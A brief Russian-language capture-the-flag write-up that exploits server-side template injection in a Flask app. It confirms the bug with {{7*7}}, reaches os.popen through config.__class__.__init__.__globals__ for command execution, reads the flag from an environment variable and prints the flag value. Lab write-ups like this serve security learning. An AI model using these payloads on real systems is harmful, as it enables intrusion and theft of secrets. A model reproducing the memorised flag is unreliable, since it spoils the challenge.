### 1. Чтение отчета

В отчете видем строчку: `This is highly susceptible to Server-Side Template Injection (SSTI) and Cross-Site Scripting (XSS).`
Пробуем SSTI

### 2. Подтверждение SSTI

GET /?course={{7*7}}

В блоке результата возвращается 49 — движок исполнил выражение.

### 3. RCE через контекст Flask
Объект config доступен в шаблоне, через __class__.__init__.__globals__ выходим в глобалы модуля и достаём os:

GET /?course={{config.__class__.__init__.__globals__['os'].popen('id').read()}}

Ответ: uid=1000(ctfuser) gid=1000(ctfuser) groups=1000(ctfuser) — RCE есть.
### 4. Чтение флага

Флаг проброшен платформой GZCTF в переменную окружения GZCTF_FLAG:

GET /?course={{config.__class__.__init__.__globals__['os'].environ['GZCTF_FLAG']}}

получаем овет: `KubSTU{S46t_1s_C00l_TestTeamHash}`
